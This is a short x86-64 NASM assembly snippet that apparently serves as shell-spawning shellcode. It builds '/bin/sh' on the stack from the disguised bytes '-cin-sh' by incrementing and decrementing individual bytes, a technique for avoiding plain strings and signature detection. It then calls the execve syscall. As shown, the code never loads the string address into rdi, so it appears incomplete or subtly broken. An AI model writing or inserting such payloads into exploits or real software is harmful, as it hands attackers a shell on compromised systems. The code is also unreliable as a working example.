[SECTION .TEXT]
	global _main
_main:
; -cin-sh(01)
; /bin/sh(00)
	push 0x6e69632d
	mov dword [rsp+4], 0x0168732d
	inc byte [rsp]
	inc byte [rsp]
	dec byte [rsp+1]
	inc byte [rsp+4]
	inc byte [rsp+4]
	dec byte [rsp+7]				; "/bin/sh"
	;mov dl, byte [rsp+7]
	push 0
    pop rdx                 ; rdx = NULL
    push 0
    pop rsi                 ; rsi = NULL

    push 59
    pop rax
    syscall
